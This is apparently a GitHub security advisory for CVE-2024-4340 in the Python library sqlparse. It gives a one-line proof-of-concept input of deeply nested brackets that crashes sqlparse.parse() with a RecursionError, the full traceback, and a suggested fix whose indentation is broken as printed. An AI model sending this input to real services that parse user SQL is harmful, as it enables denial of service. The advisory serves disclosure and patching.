# [H] sqlparse parsing heavily nested list leads to Denial of Service

## Summary
Severity: High
Advisory: GHSA-2m57-hf25-phgg
CVE: CVE-2024-4340
CWE: CWE-674
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-04-15
Source: https://github.com/advisories/GHSA-2m57-hf25-phgg
Type: github-advisory

## Affected
- PyPI: `sqlparse` — affected >=0 <0.5.0

## Details
### Summary
Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.

### Details + PoC
Running the following code will raise Maximum recursion limit exceeded exception:
```py
import sqlparse
sqlparse.parse('[' * 10000 + ']' * 10000)
```
We expect a traceback of RecursionError:
```py
Traceback (most recent call last):
  File "trigger_sqlparse_nested_list.py", line 3, in <module>
    sqlparse.parse('[' * 10000 + ']' * 10000)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/__init__.py", line 30, in parse
    return tuple(parsestream(sql, encoding))
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/filter_stack.py", line 36, in run
    stmt = grouping.group(stmt)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py", line 428, in group
    func(stmt)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py", line 53, in group_brackets
    _group_matching(tlist, sql.SquareBrackets)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py", line 48, in _group_matching
    tlist.group_tokens(cls, open_idx, close_idx)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 328, in group_tokens
    grp = grp_cls(subtokens)
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 161, in __init__
    super().__init__(None, str(self))
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 165, in __str__
    return ''.join(token.value for token in self.flatten())
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 165, in <genexpr>
    return ''.join(token.value for token in self.flatten())
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  File "/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py", line 214, in flatten
    yield from token.flatten()
  [Previous line repeated 983 more times]
RecursionError: maximum recursion depth exceeded
```

### Fix suggestion
The [flatten()](https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/sql.py#L207) function of TokenList class should limit the recursion to a maximal depth:
```py
from sqlparse.exceptions import SQLParseError

MAX_DEPTH = 100

    def flatten(self, depth=1):
        """Generator yielding ungrouped tokens.

        This method is recursively called for all child tokens.
        """
    if depth >= MAX_DEPTH:
        raise SQLParseError('Maximal depth reached')
        for token in self.tokens:
            if token.is_group:
                yield from token.flatten(depth + 1)
            else:
                yield token
```

### Impact
Denial of Service (the impact depends on the use).
Anyone parsing a user input with sqlparse.parse() is affected.

## References
- https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-2m57-hf25-phgg
- https://nvd.nist.gov/vuln/detail/CVE-2024-4340
- https://github.com/andialbrecht/sqlparse/commit/b4a39d9850969b4e1d6940d32094ee0b42a2cf03
- https://github.com/andialbrecht/sqlparse
- https://research.jfrog.com/vulnerabilities/sqlparse-stack-exhaustion-dos-jfsa-2024-001031292
